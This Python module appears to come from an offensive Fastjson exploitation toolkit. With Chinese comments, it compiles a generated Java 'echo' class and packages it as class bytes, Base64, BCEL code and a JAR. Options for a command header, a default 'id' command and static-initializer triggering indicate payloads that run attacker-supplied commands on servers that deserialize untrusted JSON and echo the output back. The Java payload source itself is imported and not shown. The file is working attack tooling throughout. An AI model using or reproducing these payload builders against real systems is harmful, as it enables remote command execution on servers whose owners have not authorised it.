"""编译回显类 → .class / Base64 / BCEL / JAR。"""

from __future__ import annotations

import base64
import io
import shutil
import subprocess
import tempfile
import zipfile
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

from fastjson_toolkit.poc.echo.source import (
    DEFAULT_CLASS_NAME,
    DEFAULT_CMD_HEADER,
    build_echo_java_source,
)


@dataclass(frozen=True)
class EchoArtifact:
    class_name: str
    class_bytes: bytes
    class_b64: str
    bcel_code: str
    cmd_header: str
    engine: str
    source: str

    def as_jar(self, entry_name: Optional[str] = None) -> bytes:
        name = entry_name or f"{self.class_name}.class"
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(name, self.class_bytes)
        return buf.getvalue()


def _which_javac() -> str:
    path = shutil.which("javac")
    if not path:
        raise RuntimeError("未找到 javac，请安装 JDK 并加入 PATH")
    return path


def compile_java_source(
    src_text: str,
    class_name: str,
    *,
    classpath: str = "",
    out_dir: Optional[Path] = None,
) -> bytes:
    """javac 编译单个顶层类，返回 .class 字节。"""
    javac = _which_javac()
    cleanup = False
    if out_dir is None:
        tmp = tempfile.mkdtemp(prefix="fj-echo-")
        out_dir = Path(tmp)
        cleanup = True
    try:
        out_dir.mkdir(parents=True, exist_ok=True)
        src_path = out_dir / f"{class_name}.java"
        src_path.write_text(src_text, encoding="utf-8")
        cmd = [
            javac,
            "-encoding",
            "UTF-8",
            "-source",
            "8",
            "-target",
            "8",
        ]
        if classpath:
            cmd.extend(["-cp", classpath])
        cmd.extend(["-d", str(out_dir), str(src_path)])
        proc = subprocess.run(cmd, capture_output=True)
        if proc.returncode != 0:
            err = (proc.stderr or proc.stdout or b"").decode("utf-8", errors="replace")
            raise RuntimeError(f"javac failed for {class_name}:\n{err}")
        # 支持 package：在 out_dir 下递归找
        matches = list(out_dir.rglob(f"{class_name}.class"))
        if not matches:
            raise RuntimeError(f"missing compiled class: {class_name}")
        return matches[0].read_bytes()
    finally:
        if cleanup:
            shutil.rmtree(out_dir, ignore_errors=True)


def build_echo_artifact(
    *,
    engine: str = "auto",
    cmd_header: str = DEFAULT_CMD_HEADER,
    default_cmd: str = "id",
    class_name: str = DEFAULT_CLASS_NAME,
    proof_path: Optional[str] = None,
    banner: str = "FJ-ECHO",
    package: Optional[str] = None,
    extra_imports: Optional[list[str]] = None,
    class_annotations: Optional[list[str]] = None,
    implements: Optional[list[str]] = None,
    extra_class_body: str = "",
    trigger_static: bool = True,
    classpath: str = "",
) -> EchoArtifact:
    src = build_echo_java_source(
        class_name=class_name,
        engine=engine,
        cmd_header=cmd_header,
        default_cmd=default_cmd,
        proof_path=proof_path,
        banner=banner,
        package=package,
        extra_imports=extra_imports,
        class_annotations=class_annotations,
        implements=implements,
        extra_class_body=extra_class_body,
        trigger_static=trigger_static,
    )
    raw = compile_java_source(src, class_name, classpath=classpath)
    if not raw.startswith(b"\xca\xfe\xba\xbe"):
        raise RuntimeError("编译产物不是合法 .class")
    # 延迟导入，避免 echo ↔ v1_2_47 循环依赖
    from fastjson_toolkit.poc.v1_2_47.encode import bcel_code_from_class_bytes

    b64 = base64.b64encode(raw).decode("ascii")
    return EchoArtifact(
        class_name=class_name,
        class_bytes=raw,
        class_b64=b64,
        bcel_code=bcel_code_from_class_bytes(raw),
        cmd_header=cmd_header,
        engine=engine,
        source=src,
    )
